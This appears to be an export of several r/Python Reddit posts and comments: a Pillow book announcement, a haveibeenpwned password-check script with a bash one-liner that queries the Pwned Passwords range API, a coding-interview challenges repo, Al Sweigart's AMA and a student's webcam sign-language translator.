* [Getting GPS EXIF Data with Python](https://www.blog.pythonlibrary.org/2021/01/13/getting-gps-exif-data-with-python/)

[Mike Driscoll signing copies of Pillow: Image Processing with Python](https://preview.redd.it/15tt5xx91kr61.jpg?width=3405&format=pjpg&auto=webp&s=c9a32acc24202796b05ff1de2c0eaccf4ec5351c)

In this book, you will learn about the following:

* Opening and saving images
* Extracting image metadata
* Working with colors
* Applying image filters
* Cropping, rotating, and resizing
* Enhancing images
* Combining images
* Drawing with Pillow
* ImageChops
* Integration with GUI toolkits

You can order the eBook versions on [Leanpub](https://leanpub.com/pillow/) or [Gumroad](https://gum.co/pypillow). When you purchase through either of these websites, you will receive a PDF, epub and mobi version of the book.

The paperback and Kindle versions are now available on [Amazon](https://kdp.amazon.com/amazon-dp-action/us/dualbookshelf.marketplacelink/B08ZCQM1C1).

The paperback version of the book is in **full color**. That is why it more expensive than any of my other books to purchase.","Exciting to see this come together. I've run into the ""printing in color"" price for a Python project too.

I feel like Pillow and PIL have a lot of upside, but the whole fork confusion leads to people avoiding it. Hopefully this book helps!"
I wrote a script which goes through my LastPass vault and checks all passwords against haveibeenpwned.com and I hope somebody else finds it useful,824z5w,2018-03-05 18:16:19,,"bash one-liner to check if your password is pwned by hashing, submitting the hash and checking the response `(echo -n ""Password: ""; read -s pw; curl -s https://api.pwnedpasswords.com/range/$(echo -n $pw | shasum | cut -b 1-5) | grep $(echo -n $pw | shasum | cut -b 6-40 | tr a-f A-F))`"
Practice algorithms and data structures (and prep for coding interviews) with interactive coding challenges in Python,64j4oj,2017-04-10 19:57:18,,"Hi Reddit,

I've recently overhauled the Python interactive coding interview challenges repo, now with more than double the original content:

https://github.com/donnemartin/interactive-coding-challenges

Included are unit tested reference implementations of various data structures and algorithms.

Each Python challenge has one or more reference solutions that are:

* Fully functional
* Unit tested
* Easy-to-understand

Notebooks also detail:

* Constraints
* Test cases
* Algorithms
* Big-O time and space complexities

Anki flashcards are also available.  Great for use while on-the-go!

Bonus: If you're looking to learn/practice system design or object oriented exercises, check out the sister repo, The System Design Primer.  Solutions are also in Python.

https://github.com/donnemartin/system-design-primer

Hope this helps!

-Donne
"
"[AMA] I am Al Sweigart, author of ""Automate the Boring Stuff with Python"" and other books. Ask me anything!",16m0yqk,2023-09-19 01:01:20,"Hello, r/Python

I'm Al Sweigart, the author of Automate the Boring Stuff with Python, The Recursive Book of Recursion, Invent Your Own Computer Games with Python, and several other programming books for beginners. All of my books are freely available under a Creative Commons license on my website, https://inventwithpython.com

I'm currently working on the 3rd edition of Automate the Boring Stuff, which will have new chapters on SQLite databases, text-to-speech, optical character recognition, speech recognition, and how to use AI to help you learn to code (spoiler: it's mostly hype, but there's some utility there.)

Ask me anything, and good luck on your programming journey!

EDIT: Thanks to everyone for their questions. Okay, time for me to stop procrastinating on Reddit and get back to writing. Thanks!","Thanks everyone for the kind words, great questions, and fantastic turnout!

and thank you u/AlSweigart for the great AMA!

  
~~We will continue the AMA until 10PM EST so that more people have the change to ask things.~~

~~Keep your questions coming!~~ ![img](emote|t5_2qh0y|598)

~~P.S. If you see any non-helpful commentary, report it so that we can see it faster.~~"
Made a program for year 12 to detect sign language via the webcam and translate it to text and audio,13alyc2,2023-05-07 20:12:33,"Github: [https://github.com/4Tsuki4/Handy-Sign-Language-Detection](https://github.com/4Tsuki4/Handy-Sign-Language-Detection)

[gif of the program in use](https://i.redd.it/8i4yo3iqheya1.gif)",How many signs does it recognize? (I've seen at least two other similar proof of concepts but they all were limited to like 2-5 signs)
